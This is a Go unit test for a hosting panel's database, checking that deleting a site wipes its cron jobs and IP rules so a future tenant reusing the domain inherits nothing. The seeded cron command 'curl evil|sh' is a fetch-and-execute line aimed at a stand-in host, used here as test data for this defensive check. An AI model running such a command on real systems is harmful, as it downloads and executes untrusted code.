package db

import (
	"path/filepath"
	"testing"

	"github.com/aystro/apod/internal/models"
)

// Destroying a site must wipe its per-domain child rows so a future site that
// reuses the domain can't inherit the previous tenant's cron jobs, webhooks,
// proxy/IP rules, etc. (a cross-tenant leak — and stale cron commands would run).
func TestDeleteSiteChildData(t *testing.T) {
	d, err := Open(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	t.Cleanup(func() { d.Close() })

	const domain = "victim.test"
	if err := d.CreateSite(&models.Site{Domain: domain, Driver: "x", Owner: "alice"}); err != nil {
		t.Fatal(err)
	}
	// Seed a couple of representative child rows.
	if _, err := d.CreateCronJob(domain, "* * * * *", "curl evil|sh", ""); err != nil {
		t.Fatalf("seed cron: %v", err)
	}
	if err := d.AddIPRule(domain, "10.0.0.0/8", "allow"); err != nil {
		t.Fatalf("seed ip rule: %v", err)
	}

	if jobs, _ := d.ListCronJobs(domain); len(jobs) == 0 {
		t.Fatal("expected a seeded cron job")
	}

	if err := d.DeleteSiteChildData(domain); err != nil {
		t.Fatalf("DeleteSiteChildData: %v", err)
	}

	if jobs, _ := d.ListCronJobs(domain); len(jobs) != 0 {
		t.Errorf("cron jobs not cleared: %d remain", len(jobs))
	}
	if rules, _ := d.ListIPRules(domain); len(rules) != 0 {
		t.Errorf("ip rules not cleared: %d remain", len(rules))
	}
}
